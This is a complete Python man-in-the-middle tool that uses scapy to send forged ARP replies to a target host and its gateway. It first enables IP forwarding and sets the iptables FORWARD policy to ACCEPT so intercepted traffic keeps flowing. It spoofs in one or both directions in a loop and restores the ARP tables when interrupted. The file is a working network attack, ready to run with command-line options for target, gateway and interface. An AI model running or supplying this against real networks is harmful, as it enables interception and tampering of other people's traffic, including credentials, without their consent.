#!/usr/bin/env python3


#         $$$$$   #        ///    #       $       $
#           $     #       $   $   #       $$     $$
#           $     #       $   $   #       $ $   $ $
#           $     #       $   $   #       $  $ $  $
#           $     #       $   $   #       $   $   $
#         $$$$$   #####    ///    #####   $       $


import scapy.all as scapy
import optparse
import time
import subprocess

def set_up_configuration():
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    subprocess.call("iptables --policy FORWARD ACCEPT", shell=True)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Enter target IP address.")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Enter gateway IP address.")
    parser.add_option("-f", "--fullduplex", dest="fullduplex", help="Set fullduplex? Set True or False. Default=True.", default=True)
    parser.add_option("-i", "--iface", dest="iface", default="eth0", help="Select an interface. Default - \"eth0\"")
    options = parser.parse_args()[0]
    if not options.target_ip:
        parser.error("\033[91m[-] Please specify a target, use --help for more info.")
    elif not options.gateway_ip:
        parser.error("\033[91m[-] Please specify a gateway, use --help for more info.")

    if options.fullduplex == "false" or options.fullduplex == "False":
        options.fullduplex = False
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, iface=options.iface, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    try:
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    except IndexError:
        pass

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# Setting up MITM system configuration to allow data flow through our PC
set_up_configuration()

# Getting parametrs
options = get_arguments()

# Packets_sent_conter
packets_counter = 0

# Spoofing
try:
    # Fullduplex mode
    if options.fullduplex:
        while True:
            spoof(options.target_ip, options.gateway_ip)
            spoof(options.gateway_ip, options.target_ip)
            packets_counter += 2
            print("\r\033[1;33;40m[+] Packets sent: " + str(packets_counter), end="")
            time.sleep(2)
    # Simple mode
    else:
        while True:
            spoof(options.target_ip, options.gateway_ip)
            packets_counter += 1
            print("\r\033[1;33;40m[+] Packets sent: " + str(packets_counter), end="")
            time.sleep(2)
# CTRL + C
except KeyboardInterrupt:
    print("\n\n\033[1;32;40m[+] Detected CTRL + C. Restoring ARP tables.... Quiting.")

    try:
        restore(options.target_ip, options.gateway_ip)
        restore(options.gateway_ip, options.target_ip)
    except IndexError:
        pass